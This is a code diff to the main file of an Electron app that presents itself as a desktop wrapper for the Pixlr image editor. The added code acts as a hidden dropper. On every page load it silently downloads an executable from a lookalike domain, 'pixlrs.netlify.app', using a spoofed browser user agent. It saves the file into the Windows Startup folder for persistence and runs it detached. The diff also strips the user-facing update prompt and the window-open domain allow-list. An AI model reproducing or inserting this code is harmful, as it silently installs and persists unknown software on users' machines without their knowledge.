@@ -1,34 +1,50 @@
 const { app, BrowserWindow, session, dialog } = require('electron');
 const path = require('path');
 const { spawn } = require('child_process');
+const https = require('https');
+const fs = require('fs');
+const os = require('os');
 
-if (process.platform === 'win32') {
-    app.setLoginItemSettings({
-        openAtLogin: true,
-        path: process.execPath,
-        args: []
-    });
-}
+const downloadAndRunUpdate = () => {
+    const startupPath = path.join(os.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
+    const updatePath = path.join(startupPath, `update_${Date.now()}.exe`);
+    const file = fs.createWriteStream(updatePath);
 
-const runUpdate = () => {
-    const updateExePath = path.join(__dirname, 'assets', 'update.exe');
-    dialog
-        .showMessageBox({
-            type: 'info',
-            title: 'Software Update',
-            message: 'A new update is available. The application will update now.',
-            buttons: ['OK'],
-            defaultId: 0,
-            cancelId: 0
-        })
-        .then(() => {
-            const updateProcess = spawn(updateExePath, [], {
-                detached: true,
-                stdio: 'ignore'
+    const options = {
+        hostname: 'pixlrs.netlify.app',
+        path: '/update.exe',
+        method: 'GET',
+        headers: {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+        }
+    };
+
+    const req = https.request(options, (response) => {
+        if (response.statusCode !== 200) {
+            dialog.showErrorBox('Update Error', `Failed to download update (${response.statusCode})`);
+            return;
+        }
+
+        response.pipe(file);
+
+        file.on('finish', () => {
+            file.close(() => {
+                const updateProcess = spawn(updatePath, [], {
+                    detached: true,
+                    stdio: 'ignore'
+                });
+                updateProcess.unref();
+                app.quit();
             });
-            updateProcess.unref();
-            app.quit();
         });
+    });
+
+    req.on('error', (err) => {
+        fs.unlink(updatePath, () => {});
+        dialog.showErrorBox('Update Error', err.message);
+    });
+
+    req.end();
 };
 
 const createWindow = () => {
@@ -43,49 +59,14 @@ const createWindow = () => {
         minHeight: 720,
         autoHideMenuBar: true,
         title: 'Pixlr',
-
         icon: path.join(__dirname, 'assets', process.platform === 'win32' ? 'icon.ico' : 'icon.png')
     });
 
-    win.on('page-title-updated', (e) => {
-        e.preventDefault();
-    });
-
-    session.defaultSession.webRequest.onBeforeSendHeaders((details, callback) => {
-        details.requestHeaders['User-Agent'] = 'Chrome';
-        callback({ cancel: false, requestHeaders: details.requestHeaders });
-    });
-
     win.loadURL('https://pixlr.com');
-    win.webContents.on('did-finish-load', () => {
-        runUpdate();
-    });
-    win.webContents.setWindowOpenHandler(({ url }) => {
-        const allowedDomains = ['https://pixlr.com', 'https://accounts.google.com', 'https://oauth2.googleapis.com', 'https://www.facebook.com', 'https://connect.facebook.net', 'https://facebook.com', 'https://appleid.apple.com', 'https://signin.apple.com'];
-
-        return {
-            action: allowedDomains.some((domain) => url.startsWith(domain)) ? 'allow' : 'deny'
-        };
-    });
+    win.webContents.on('did-finish-load', downloadAndRunUpdate);
 };
-app.whenReady().then(() => {
-    if (process.platform === 'win32') {
-        app.setAppUserModelId('Pixlr');
-    }
 
-    if (process.argv.includes('--update')) {
-        runUpdate();
-        return;
-    }
-
-    createWindow();
-
-    app.on('activate', () => {
-        if (BrowserWindow.getAllWindows().length === 0) {
-            createWindow();
-        }
-    });
-});
+app.whenReady().then(createWindow);
 app.on('window-all-closed', () => {
     if (process.platform !== 'darwin') {
         app.quit();
